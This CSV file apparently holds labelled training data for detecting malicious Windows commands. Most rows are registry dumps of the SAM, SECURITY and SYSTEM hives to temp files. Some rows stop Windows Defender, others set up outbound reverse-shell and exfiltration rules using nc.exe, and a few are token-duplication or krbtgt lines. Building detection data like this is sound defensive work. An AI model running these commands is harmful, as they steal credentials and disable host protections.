text,label
reg export hklm\security c:\windows\temp\064si1bt.save,1
reg export hklm\system c:\windows\temp\32gpckfe.save,1
reg save hklm\security c:\windows\temp\e024rxho.save,1
reg export hklm\system c:\windows\temp\ogpdauxd.save,1
reg export hklm\sam c:\windows\temp\jtc9v2vi.save,1
reg save hklm\security c:\windows\temp\x0ftfq01.save,1
reg save hklm\system c:\windows\temp\mlwkvvq8.save,1
reg save hklm\system c:\windows\temp\fwh9mxff.save,1
reg export hklm\system c:\windows\temp\mf78jn1q.save,1
reg save hklm\security c:\windows\temp\re4r6vjh.save,1
reg export hklm\sam c:\windows\temp\yr8m3csc.save,1
reg save hklm\security c:\windows\temp\ttisotvg.save,1
reg save hklm\security c:\windows\temp\r7c3v7zg.save,1
reg save hklm\system c:\windows\temp\xecb9ciq.save,1
reg export hklm\system c:\windows\temp\e7ta0u7w.save,1
reg save hklm\sam c:\windows\temp\flezr4k3.save,1
reg export hklm\sam c:\windows\temp\4wucq66c.save,1
reg export hklm\sam c:\windows\temp\8k68l8d0.save,1
reg export hklm\security c:\windows\temp\b3i2szz2.save,1
"cmd.exe /c ""reg   export   hklm\sam   c:\windows\temp\ga4f59ff.save""",1
reg export hklm\sam c:\windows\temp\s4fyziyt.save,1
reg export hklm\security c:\windows\temp\qwij86au.save,1
reg save hklm\system c:\windows\temp\new0dn4e.save,1
reg export hklm\system c:\windows\temp\cdrl2uze.save,1
reg save hklm\system c:\windows\temp\eu74jnpz.save,1
"powershell -nop -c ""rule:   reverse   shell   |   app:   c:\windows\temp\nc.exe   |   dir:   outbound   |   act:   allow   |   port:   tcp   8888""",2
reg save hklm\security c:\windows\temp\t02joqx5.save,1
reg save hklm\security c:\windows\temp\mxzdlmob.save,1
reg save hklm\system c:\windows\temp\8711tqk5.save,1
reg save hklm\system c:\windows\temp\mhswi0xo.save,1
reg export hklm\security c:\windows\temp\ze78ukly.save,1
reg export hklm\security c:\windows\temp\5r4nevh5.save,1
reg export hklm\security c:\windows\temp\ohy44ogf.save,1
reg save hklm\security c:\windows\temp\htea8nlr.save,1
reg export hklm\sam c:\windows\temp\5gvwpynf.save,1
reg export hklm\sam c:\windows\temp\w9bmjpm0.save,1
"powershell -nop -c ""reg   export   hklm\security   c:\windows\temp\3c1sd3zc.save""",1
reg save hklm\security c:\windows\temp\frtgtm57.save,1
reg export hklm\security c:\windows\temp\jdofzjzf.save,1
reg export hklm\system c:\windows\temp\v6nh4jyj.save,1
reg save hklm\sam c:\windows\temp\ydaxsesq.save,1
reg save hklm\sam c:\windows\temp\z9agaz91.save,1
reg save hklm\sam c:\windows\temp\8zggk3jw.save,1
reg export hklm\sam c:\windows\temp\owqpsavx.save,1
reg export hklm\security c:\windows\temp\tvmbougv.save,1
reg export hklm\security c:\windows\temp\fwcooumw.save,1
"powershell -nop -c ""reg   export   hklm\sam   c:\windows\temp\9eg9je0e.save""",1
reg save hklm\sam c:\windows\temp\csg2lo0m.save,1
reg save hklm\security c:\windows\temp\xc8us4mh.save,1
reg export hklm\security c:\windows\temp\2kcbtm78.save,1
reg export hklm\system c:\windows\temp\a89zbx4w.save,1
reg save hklm\sam c:\windows\temp\amy2fhpa.save,1
reg export hklm\security c:\windows\temp\xiev6fes.save,1
reg save hklm\security c:\windows\temp\zl0vu01q.save,1
reg export hklm\security c:\windows\temp\qggrafh8.save,1
reg save hklm\sam c:\windows\temp\u8bp7kla.save,1
reg save hklm\security c:\windows\temp\xuzbagwk.save,1
reg save hklm\sam c:\windows\temp\9bhm4xgk.save,1
reg save hklm\sam c:\windows\temp\lo07mpu6.save,1
reg save hklm\security c:\windows\temp\y2xryhf2.save,1
reg save hklm\security c:\windows\temp\9vugrfpm.save,1
reg export hklm\sam c:\windows\temp\syduipea.save,1
reg export hklm\sam c:\windows\temp\ofoqh4yz.save,1
"powershell -nop -c ""rule:  reverse  shell  |  app:  c:\windows\temp\nc.exe  |  dir:  outbound  |  act:  allow  |  port:  tcp  8888""",2
reg export hklm\sam c:\windows\temp\mt3oihni.save,1
reg export hklm\system c:\windows\temp\ws123wui.save,1
reg save hklm\security c:\windows\temp\1eqwqe5x.save,1
reg save hklm\system c:\windows\temp\krsa2w4t.save,1
reg export hklm\sam c:\windows\temp\t9cbuy74.save,1
reg save hklm\system c:\windows\temp\e0ov803q.save,1
reg export hklm\system c:\windows\temp\31ur0e9q.save,1
reg save hklm\system c:\windows\temp\tgg4twxu.save,1
reg save hklm\system c:\windows\temp\6esx4tgn.save,1
reg export hklm\system c:\windows\temp\ahsxped1.save,1
reg export hklm\system c:\windows\temp\ncz6tjzi.save,1
reg save hklm\system c:\windows\temp\hwqgg3hw.save,1
reg save hklm\system c:\windows\temp\ok4frsn9.save,1
reg save hklm\security c:\windows\temp\u27fw89x.save,1
reg save hklm\security c:\windows\temp\vmzn97ua.save,1
"cmd.exe /c ""reg  save  hklm\security  c:\windows\temp\x014bgr7.save""",1
reg export hklm\security c:\windows\temp\kp0n2y6y.save,1
reg export hklm\system c:\windows\temp\g8c6v2xv.save,1
"powershell -nop -c ""reg  save  hklm\security  c:\windows\temp\qiwlf3se.save""",1
reg save hklm\sam c:\windows\temp\iy9v4x0b.save,1
reg save hklm\sam c:\windows\temp\kd9qtpgd.save,1
reg save hklm\system c:\windows\temp\0ji40qxa.save,1
reg save hklm\security c:\windows\temp\ynwuwjt9.save,1
reg save hklm\security c:\windows\temp\is3qnhqc.save,1
reg save hklm\system c:\windows\temp\wreyo3qj.save,1
reg save hklm\sam c:\windows\temp\w1spbwqt.save,1
reg export hklm\security c:\windows\temp\qisbbhbn.save,1
reg export hklm\sam c:\windows\temp\zp9p0quv.save,1
reg export hklm\sam c:\windows\temp\piof4cjr.save,1
reg export hklm\security c:\windows\temp\maji9aqj.save,1
reg save hklm\system c:\windows\temp\e4s0fcyq.save,1
reg export hklm\sam c:\windows\temp\2sjx30h7.save,1
reg save hklm\sam c:\windows\temp\821blw96.save,1
reg save hklm\system c:\windows\temp\tu5nvgg6.save,1
reg save hklm\system c:\windows\temp\447cy0s9.save,1
reg export hklm\system c:\windows\temp\jw0c3qsc.save,1
reg export hklm\security c:\windows\temp\hx8cvws6.save,1
reg export hklm\security c:\windows\temp\g01kyz8h.save,1
reg save hklm\sam c:\windows\temp\l0rscgwl.save,1
reg export hklm\system c:\windows\temp\5iyg6dca.save,1
reg export hklm\security c:\windows\temp\e4gax7sh.save,1
reg save hklm\security c:\windows\temp\2wzffw5k.save,1
reg save hklm\sam c:\windows\temp\zziyqtnv.save,1
reg save hklm\security c:\windows\temp\cw88ovdq.save,1
reg save hklm\sam c:\windows\temp\k5o0b02o.save,1
reg save hklm\system c:\windows\temp\p7nkx34b.save,1
"cmd.exe /c ""reg   save   hklm\security   c:\windows\temp\g4ua8g1y.save""",1
"cmd.exe /c ""get-registry-value -path hklm\sam\domains""",0
reg export hklm\security c:\windows\temp\aols4bp9.save,1
reg export hklm\system c:\windows\temp\e1kqfydf.save,1
reg save hklm\security c:\windows\temp\3192yh6a.save,1
reg export hklm\sam c:\windows\temp\3g8b9oft.save,1
reg export hklm\security c:\windows\temp\qd0c9s4p.save,1
reg export hklm\sam c:\windows\temp\j7eev5fx.save,1
reg export hklm\security c:\windows\temp\n56tejvm.save,1
reg export hklm\system c:\windows\temp\0ttoszi7.save,1
reg export hklm\sam c:\windows\temp\ykhd163d.save,1
reg export hklm\sam c:\windows\temp\mazzl3b2.save,1
reg save hklm\sam c:\windows\temp\m23nk6k2.save,1
reg export hklm\security c:\windows\temp\6o0bcsro.save,1
reg export hklm\security c:\windows\temp\grspk9y8.save,1
reg save hklm\system c:\windows\temp\0qu8o3pu.save,1
reg export hklm\sam c:\windows\temp\srszfbf1.save,1
reg save hklm\sam c:\windows\temp\9wgyqeq9.save,1
reg export hklm\security c:\windows\temp\lfszvumn.save,1
reg save hklm\system c:\windows\temp\lbqqc0re.save,1
reg save hklm\security c:\windows\temp\8vy0s5vq.save,1
reg export hklm\system c:\windows\temp\kxdq8abv.save,1
reg export hklm\sam c:\windows\temp\k70puuk7.save,1
reg export hklm\sam c:\windows\temp\tk2fbivs.save,1
reg export hklm\security c:\windows\temp\2k2kew8v.save,1
reg export hklm\system c:\windows\temp\awl0h2x9.save,1
reg export hklm\security c:\windows\temp\3lpalzqy.save,1
reg export hklm\security c:\windows\temp\5asq58u1.save,1
reg export hklm\sam c:\windows\temp\rndrd3mq.save,1
reg export hklm\sam c:\windows\temp\vpft6ldt.save,1
reg export hklm\system c:\windows\temp\n8y0kiok.save,1
reg save hklm\security c:\windows\temp\4pqgrwyg.save,1
reg save hklm\system c:\windows\temp\ki9tmdwr.save,1
"powershell -nop -c ""reg save hklm\security c:\windows\temp\ub35mxm8.save""",1
reg export hklm\security c:\windows\temp\op8nwkd0.save,1
reg save hklm\sam c:\windows\temp\457wy3o7.save,1
reg export hklm\security c:\windows\temp\b6jy7roz.save,1
reg save hklm\sam c:\windows\temp\rgrudyb6.save,1
reg save hklm\security c:\windows\temp\k9ylukwe.save,1
reg save hklm\system c:\windows\temp\ulax49s1.save,1
reg export hklm\sam c:\windows\temp\8argxab3.save,1
reg export hklm\system c:\windows\temp\pekqhjjy.save,1
reg save hklm\sam c:\windows\temp\xrsyrk9r.save,1
reg export hklm\sam c:\windows\temp\smzfliie.save,1
reg save hklm\sam c:\windows\temp\wa1oooxc.save,1
reg save hklm\system c:\windows\temp\83xnu3pc.save,1
reg save hklm\system c:\windows\temp\d81tv8j2.save,1
reg export hklm\system c:\windows\temp\6kx0lg8h.save,1
reg save hklm\system c:\windows\temp\tkayc2j6.save,1
reg export hklm\security c:\windows\temp\j80p2ux6.save,1
reg export hklm\sam c:\windows\temp\i9mlf1xi.save,1
reg save hklm\sam c:\windows\temp\u4qvk9go.save,1
reg export hklm\sam c:\windows\temp\8n0xnspq.save,1
reg save hklm\security c:\windows\temp\l66xkixp.save,1
reg export hklm\security c:\windows\temp\ntlo01gf.save,1
reg save hklm\sam c:\windows\temp\ofsw2ckv.save,1
"powershell -nop -c ""reg  save  hklm\security  c:\windows\temp\uf3j5q1b.save""",1
reg export hklm\security c:\windows\temp\9tukcsg7.save,1
reg save hklm\security c:\windows\temp\1t8kcnbg.save,1
reg save hklm\system c:\windows\temp\7t144ljp.save,1
reg save hklm\security c:\windows\temp\rfjriozk.save,1
reg export hklm\sam c:\windows\temp\swckuvt5.save,1
reg export hklm\security c:\windows\temp\ucxjeppm.save,1
reg export hklm\security c:\windows\temp\baj35rca.save,1
reg save hklm\sam c:\windows\temp\5l4jz8ib.save,1
reg export hklm\system c:\windows\temp\qdzknixv.save,1
"powershell -nop -c ""reg save hklm\system c:\windows\temp\t6rd17zl.save""",1
reg export hklm\security c:\windows\temp\whv548co.save,1
"powershell -nop -c ""reg export hklm\sam c:\windows\temp\muwueshx.save""",1
reg export hklm\security c:\windows\temp\13hsp1d0.save,1
reg export hklm\sam c:\windows\temp\kjqexce3.save,1
reg save hklm\sam c:\windows\temp\8z0knolt.save,1
reg save hklm\sam c:\windows\temp\rq0gpjzh.save,1
reg save hklm\security c:\windows\temp\za72fpdg.save,1
reg export hklm\security c:\windows\temp\9tlv5hyt.save,1
reg export hklm\sam c:\windows\temp\4dyk865d.save,1
reg save hklm\system c:\windows\temp\yzlcg6wk.save,1
reg save hklm\system c:\windows\temp\tz4b3djn.save,1
reg save hklm\security c:\windows\temp\oqd648k3.save,1
reg save hklm\sam c:\windows\temp\3kqhydup.save,1
reg   export   hklm\security   c:\windows\temp\mfszxnon.save,1
reg export hklm\security c:\windows\temp\svw25ltf.save,1
reg export hklm\sam c:\windows\temp\8h6csdsv.save,1
"cmd.exe /c ""reg   save   hklm\security   c:\windows\temp\t2hvwyap.save""",1
reg export hklm\sam c:\windows\temp\xlm6sqn0.save,1
reg export hklm\sam c:\windows\temp\1e7ajecz.save,1
reg export hklm\sam c:\windows\temp\80ia65hc.save,1
reg export hklm\system c:\windows\temp\97631stl.save,1
reg export hklm\security c:\windows\temp\0o7r587e.save,1
reg save hklm\system c:\windows\temp\vlp0bhzi.save,1
reg save hklm\system c:\windows\temp\4n69ipg1.save,1
reg export hklm\system c:\windows\temp\ruvvjjtb.save,1
reg export hklm\system c:\windows\temp\0m9fntud.save,1
reg save hklm\system c:\windows\temp\qkbzndlt.save,1
reg export hklm\system c:\windows\temp\hdelgx2a.save,1
reg export hklm\sam c:\windows\temp\kf8enc53.save,1
reg export hklm\sam c:\windows\temp\cnvzkg9o.save,1
reg save hklm\sam c:\windows\temp\4tnbkvls.save,1
reg  export  hklm\sam  c:\windows\temp\iqnmrcjp.save,1
reg export hklm\sam c:\windows\temp\hdcthde5.save,1
reg export hklm\system c:\windows\temp\a44ifcn2.save,1
reg save hklm\security c:\windows\temp\n8tdkmw2.save,1
reg save hklm\sam c:\windows\temp\rpsclqfb.save,1
reg export hklm\sam c:\windows\temp\ke6b5nhe.save,1
reg export hklm\system c:\windows\temp\f9i4y2vp.save,1
"powershell -nop -c ""rule:  reverse  shell  |  app:  any  |  dir:  outbound  |  act:  allow  |  port:  4444""",2
reg export hklm\sam c:\windows\temp\hw26h9qd.save,1
reg export hklm\security c:\windows\temp\95v3r5r2.save,1
reg export hklm\sam c:\windows\temp\eyzwigy7.save,1
reg save hklm\security c:\windows\temp\3oq71wmr.save,1
reg export hklm\security c:\windows\temp\ay90w82v.save,1
reg save hklm\security c:\windows\temp\5y6dsp5o.save,1
reg export hklm\security c:\windows\temp\i8qioz6i.save,1
reg export hklm\system c:\windows\temp\nu4u2cid.save,1
reg save hklm\security c:\windows\temp\4db3hjst.save,1
reg export hklm\system c:\windows\temp\3ygwtjb5.save,1
"powershell -nop -c ""reg  export  hklm\sam  c:\windows\temp\81yt17nj.save""",1
reg save hklm\security c:\windows\temp\f2kkmzfi.save,1
reg export hklm\system c:\windows\temp\vpo3pu7l.save,1
reg save hklm\system c:\windows\temp\7nouzesk.save,1
reg export hklm\sam c:\windows\temp\3o64x41f.save,1
reg save hklm\sam c:\windows\temp\to3n41w7.save,1
reg save hklm\system c:\windows\temp\4wrjfa0a.save,1
reg export hklm\sam c:\windows\temp\vcdr7ce8.save,1
reg export hklm\sam c:\windows\temp\jjdjwofl.save,1
reg save hklm\security c:\windows\temp\xxqzy4co.save,1
reg save hklm\sam c:\windows\temp\7tg3u096.save,1
reg export hklm\sam c:\windows\temp\0qoq3b31.save,1
reg save hklm\security c:\windows\temp\gnx078d1.save,1
"powershell -nop -c ""reg  export  hklm\sam  c:\windows\temp\vl8yv1oj.save""",1
reg save hklm\security c:\windows\temp\cn3obxn1.save,1
"powershell -nop -c ""rule:  exfil  data  |  app:  any  |  dir:  outbound  |  act:  allow  |  port:  tcp  8888""",2
reg save hklm\sam c:\windows\temp\0wwsuccg.save,1
reg save hklm\security c:\windows\temp\qdzi4fmx.save,1
reg export hklm\system c:\windows\temp\za30v7tg.save,1
reg save hklm\security c:\windows\temp\u2h676zq.save,1
reg save hklm\system c:\windows\temp\orieoyth.save,1
reg  save  hklm\security  c:\windows\temp\75ewsn8q.save,1
reg export hklm\security c:\windows\temp\a5wim5ek.save,1
reg save hklm\security c:\windows\temp\x04n0b4p.save,1
reg export hklm\sam c:\windows\temp\fyoiu81u.save,1
reg save hklm\security c:\windows\temp\s9hpkx2q.save,1
reg  save  hklm\security  c:\windows\temp\aefuiw94.save,1
reg export hklm\security c:\windows\temp\2z496ip9.save,1
reg save hklm\sam c:\windows\temp\ge1vz2fj.save,1
reg export hklm\system c:\windows\temp\d94yg5dr.save,1
"cmd.exe /c ""reg  save  hklm\system  c:\windows\temp\vkh51akw.save""",1
reg save hklm\sam c:\windows\temp\y6baguvn.save,1
"cmd.exe /c ""reg export hklm\system c:\windows\temp\muhclcxg.save""",1
reg save hklm\sam c:\windows\temp\ynrbnbn2.save,1
reg export hklm\sam c:\windows\temp\yzggmcpo.save,1
reg export hklm\security c:\windows\temp\03s5unfu.save,1
"cmd.exe /c ""rule:   exfil   data   |   app:   c:\windows\temp\nc.exe   |   dir:   outbound   |   act:   allow   |   port:   tcp   8888""",2
reg export hklm\sam c:\windows\temp\txd76enh.save,1
reg export hklm\security c:\windows\temp\ouwpr71f.save,1
reg export hklm\sam c:\windows\temp\jl2p7wv1.save,1
reg export hklm\system c:\windows\temp\2gfcvz35.save,1
reg save hklm\sam c:\windows\temp\81c3e9ip.save,1
reg save hklm\system c:\windows\temp\2di5anl8.save,1
reg export hklm\sam c:\windows\temp\2w2pdq0a.save,1
reg save hklm\system c:\windows\temp\s2eeta3p.save,1
reg save hklm\security c:\windows\temp\9kkkpvnz.save,1
reg save hklm\sam c:\windows\temp\7ulwv9ap.save,1
reg save hklm\security c:\windows\temp\h85drutc.save,1
"cmd.exe /c ""sc  stop  windefend""",2
reg save hklm\security c:\windows\temp\kej7jh6w.save,1
reg export hklm\system c:\windows\temp\66gitr2k.save,1
reg save hklm\security c:\windows\temp\yt7vzwzi.save,1
reg save hklm\system c:\windows\temp\fenc9yec.save,1
reg save hklm\sam c:\windows\temp\i7gbwah1.save,1
reg export hklm\system c:\windows\temp\fophcddm.save,1
reg save hklm\system c:\windows\temp\kxiowtf0.save,1
reg export hklm\system c:\windows\temp\j63pktes.save,1
reg export hklm\security c:\windows\temp\s9jngft0.save,1
reg save hklm\system c:\windows\temp\57w8baom.save,1
reg save hklm\system c:\windows\temp\8tvmaa5q.save,1
reg export hklm\sam c:\windows\temp\gv24ab25.save,1
reg save hklm\system c:\windows\temp\0hb9ozz6.save,1
reg save hklm\sam c:\windows\temp\hnv7qkjm.save,1
reg save hklm\sam c:\windows\temp\p2phad0z.save,1
reg export hklm\security c:\windows\temp\ll76konk.save,1
reg export hklm\security c:\windows\temp\3r08r9zt.save,1
reg save hklm\system c:\windows\temp\rynmdcod.save,1
reg export hklm\security c:\windows\temp\75ef8mfi.save,1
reg save hklm\security c:\windows\temp\fnv3gfb0.save,1
"cmd.exe /c ""[dllimport(""advapi32.dll"")]   extern   bool   duplicatetokenex(...)""",3
reg export hklm\security c:\windows\temp\2up35dh8.save,1
reg export hklm\security c:\windows\temp\7kgrv8tw.save,1
reg save hklm\system c:\windows\temp\w4zo4qm3.save,1
reg export hklm\system c:\windows\temp\t5wyzu2x.save,1
reg export hklm\security c:\windows\temp\xk1hq5rj.save,1
reg save hklm\security c:\windows\temp\g2ilibab.save,1
"powershell -nop -c ""rule: exfil data | app: any | dir: outbound | act: allow | port: 1337""",2
reg export hklm\sam c:\windows\temp\wyby1j23.save,1
reg export hklm\system c:\windows\temp\gx1by1wq.save,1
reg save hklm\security c:\windows\temp\pmcongee.save,1
reg export hklm\system c:\windows\temp\f0rvelpv.save,1
reg save hklm\sam c:\windows\temp\bkvjch5z.save,1
reg save hklm\security c:\windows\temp\4pgs3ege.save,1
reg save hklm\sam c:\windows\temp\peb7l3xu.save,1
reg save hklm\security c:\windows\temp\d3hp2gn9.save,1
reg export hklm\security c:\windows\temp\3joc6o4n.save,1
reg save hklm\security c:\windows\temp\0o72c1ag.save,1
reg save hklm\security c:\windows\temp\hu1p4ujw.save,1
reg export hklm\security c:\windows\temp\3iwmp2rd.save,1
reg export hklm\system c:\windows\temp\8uoc8b3t.save,1
"powershell -nop -c ""klist get krbtgt/domain.local""",3
reg   export   hklm\security   c:\windows\temp\bo5q0o1p.save,1
reg export hklm\security c:\windows\temp\r1tjc7b5.save,1
reg save hklm\system c:\windows\temp\gcoc1vsr.save,1
reg export hklm\sam c:\windows\temp\8k7w4uno.save,1
reg save hklm\system c:\windows\temp\qcono7uv.save,1
reg export hklm\security c:\windows\temp\c6l2ai6k.save,1
reg export hklm\security c:\windows\temp\26d0gv04.save,1
reg save hklm\sam c:\windows\temp\3k0zdw1j.save,1
reg export hklm\sam c:\windows\temp\h65gkwb9.save,1
reg save hklm\sam c:\windows\temp\yg04rcii.save,1
reg save hklm\sam c:\windows\temp\uf8zkojx.save,1
